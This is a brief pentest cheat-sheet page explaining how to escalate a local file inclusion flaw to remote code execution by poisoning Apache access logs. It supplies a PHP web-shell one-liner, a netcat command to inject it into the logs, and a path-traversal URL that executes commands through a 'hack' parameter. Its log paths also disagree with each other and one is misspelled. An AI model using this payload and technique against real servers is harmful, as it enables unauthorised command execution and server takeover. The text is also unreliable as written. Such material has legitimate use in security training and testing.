---
description: RCE = Remote code execution
---

# LFI to RCE - Logs Infection

If you have an **LFI** ambient, you can try to get **RCE** with server logs.\
On Apache-Server, by default, the logs are in `/var/logs/apache2/access.log`

If you can see the logs, try to make a request and it shows on a log: \
ex: `https://example.com/REQUEST`

if you can see the result, possibly the application is vulnerable!

### Example .php payload:

```php
<?php system($_GET['hack']); ?>
```

To send this file for the application, use **Netcat**:

```bash
nc -v example.com -C

<?php system($_GET['hack']); ?>
```

if it works just use the parameter in the URL and you can run commands on the server remotely:

```
.../page.php?page=/../../var/log/apache2/acess.log&hack=command
```
